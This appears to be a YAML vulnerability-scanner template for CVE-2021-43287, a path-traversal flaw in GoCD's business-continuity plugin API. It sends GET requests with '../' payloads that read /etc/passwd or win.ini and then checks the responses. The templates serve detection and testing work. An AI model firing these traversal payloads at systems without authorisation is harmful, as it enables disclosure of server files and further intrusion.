name: yaml-poc-thoughtworks-gocd-leak-CVE-2021-43287
binding: c280b531-991c-4378-a292-f6529defe160
detail:
    author: system_user
    links:
        - http://wiki.hgsec.top/%E6%BC%8F%E6%B4%9E%E5%BA%93/GoCD/CVE-2021-43287%20GoCD%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/
        - https://blog.sonarsource.com/gocd-pre-auth-pipeline-takeover
        - https://cxsecurity.com/cveshow/CVE-2021-43287/
        - https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c
        - https://www.gocd.org/releases/#21-3-0
    vulnerability:
        id: ca08da0a-e0af-460d-80a3-b38449c939a1
        level: high
transport: http
rules:
    linux0:
        request:
            cache: true
            method: GET
            path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    windows0:
        request:
            cache: true
            method: GET
            path: /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini
            follow_redirects: false
        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
expression: windows0() || linux0()
